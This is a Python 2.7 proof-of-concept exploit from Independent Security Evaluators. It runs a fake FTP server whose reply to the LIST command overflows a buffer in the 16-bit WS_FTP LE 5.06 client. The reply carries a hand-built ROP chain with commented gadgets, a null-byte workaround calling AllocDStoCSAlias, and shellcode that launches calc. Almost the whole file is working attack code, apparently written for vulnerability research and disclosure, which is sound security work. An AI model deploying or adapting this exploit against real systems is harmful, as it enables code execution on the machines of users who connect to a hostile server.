#!/usr/bin/python2.7
# fakeftp.py
# Fake FTP server used to trigger buffer overflow in 16-bit version of
# WS_FTP LE 5.06 and deliver a CALC shellcode.
#
# Copyright (c) 2018, Independent Security Evaluators LLC
# All rights reserved.
# 
# Redistribution and use in source and binary forms, with or without
# modification, are permitted provided that the following conditions
# are met:
# 
# * Redistributions of source code must retain the above copyright
#   notice, this list of conditions and the following disclaimer.
# 
# * Redistributions in binary form must reproduce the above copyright
#   notice, this list of conditions and the following disclaimer in
#   the documentation and/or other materials provided with the
#   distribution.
# 
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
# "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
# LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS
# FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
# COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
# INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
# BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
# LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
# CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
# LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
# ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
# POSSIBILITY OF SUCH DAMAGE.

import os
import socket

BUFSIZ=1024

def child(addr, fd):
    print "incoming connection from", addr
    fd.send("220 hello\r\n")
    port = -1
    try:
        while True:
            buf = fd.recv(BUFSIZ)
            print buf
            sbuf=buf.split()
            cmd = ""
            args = ""

            if len(sbuf) > 0:
                cmd = sbuf[0].upper()
            if len(sbuf) > 1:
                args = sbuf[1]    
            if cmd == 'USER':
                fd.send("331 password please\r\n")            
            elif cmd == 'PASS':
                fd.send("230 welcome\r\n")
            elif cmd == 'PORT':
                args = args.split(',')
                port = (int(args[4]) << 8) | int(args[5])
                fd.send("200 PORT successful\r\n")
                print "port is", port
            elif cmd == 'LIST':
                fd.send("150 here it comes\r\n")
                dfd = socket.socket()
                try:
                    dfd.connect((addr, port))
                    dfd.send("AABBCCDDEEFFGGHHIIJJKKLLMMNNOOPPQQRRSSTTUU"
                             "VVWWXXYYZZaabbccddeeffgghhiijjkkll"
                             # New BP
                             "\x3c\x9b"
                             # near gadget 2 - RETF
                             "\x21\xa8"
                             # gadget 3
                             # MOV AX, SS
                             # MOV ES, AX
                             # MOV DS, AX
                             # RETF
                             "\x8d\x80\x7f\x04"
                             # gadget 4
                             # MOV WORD PTR [BP+0E],AX
                             # RET
                             "\x71\x5f\x17\x01"
                             # gadget 5
                             # RETF
                             "\x21\xa8"
                             # gadget 6
                             # POP AX
                             # POP BX
                             # POP CX
                             # POP DX
                             # POP ES
                             "\xce\x4b\x7f\x04"
                             # workaround null byte to call
                             # AllocDStoCSAlias (0117:00E4)
                             # AX=0x0117
                             # BX=0x00e4|0x0100
                             # CX=0x80ff
                             # DX=don't care (DX ascii)
                             # ES=any valid selector (code seg for USER)
                             "\x17\x01\xe4\x01\xff\x80XD\x7f\x04"
                             # gadget 7
                             # AND BX,CX
                             # OR WORD PTR ES:[0042],BX
                             # RETF
                             "\x14\x50\x7f\x04"
                             # gadget 8
                             # PUSH AX
                             # PUSH BX
                             # XOR AX,AX
                             # CWD
                             # XOR CX,CX
                             # MOV ES,AX
                             # RETF
                             "\xc9\x94\x17\x01"
                             # gadget 9
                             # RETF
                             "\x21\xa8\x17\x01"
                             # placeholder for arg to AllocDStoCSAlias
                             "SS"
                             # gadget 10
                             # POP BX
                             # POP CX
                             # POP DX
                             # POP ES
                             # RETF
                             "\xcf\x4b\x7f\x04"
                             # BX=hardcoded stack offset of shellcode
                             # CX=don't care (CX ascii)
                             # DX=don't care (DX ascii)
                             # ES=any valid selector (code seg for USER)
                             "\x5c\x9bXCXD\x7f\x04"
                             # gadget 11 - see gadget 8
                             "\xc9\x94\x17\x01"
                             # shellcode
                             "\x31\xc0\x50\x68\x6c\x63\x68\x63\x61\x89"
                             "\xe0\x16\x50\x6a\x05\x9a\x8f\x02\x1f\x01"
                             # filler
                             "uuttssrrqqppoonnmmllkkjjiihhggffeeddcc"
                             # initial BP - hardcoded stack addr 9B22
                             "\x22\x9b"
                             # gadget 1 - MOV SP,BP; POP BP; RET
                             "\x0b\x44\x17\x01\r\n")
                finally:
                    dfd.close()
                fd.send("226 all done\r\n")
            elif cmd == 'SYST':
                fd.send("215 UNIX Type: L8\r\n")
            elif cmd == 'HELP':
                fd.send("""214-The following commands are recognized.\r
 ABOR ACCT ALLO APPE CDUP CWD  DELE EPRT EPSV FEAT HELP LIST MDTM MKD\r
 MODE NLST NOOP OPTS PASS PASV PORT PWD  QUIT REIN REST RETR RMD  RNFR\r
 RNTO SITE SIZE SMNT STAT STOR STOU STRU SYST TYPE USER XCUP XCWD XMKD\r
 XPWD XRMD\r
214 Help OK.\r\n""")
            elif cmd == 'QUIT':
                fd.send("221 goodbye\r\n")
                break
            else:
                fd.send("500 unknown command\r\n")
    finally:
        fd.close()

def main():
    lfd = socket.socket()
    lfd.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    lfd.bind(("0.0.0.0", 2121))
    lfd.listen(0)
    try:
        while True:
            (afd, addr) = lfd.accept()
            addr = addr[0]
            if os.fork() == 0:
                lfd.close()
                child(addr, afd)
                return
            else:
                afd.close()
    finally:
        lfd.close()
        
main()
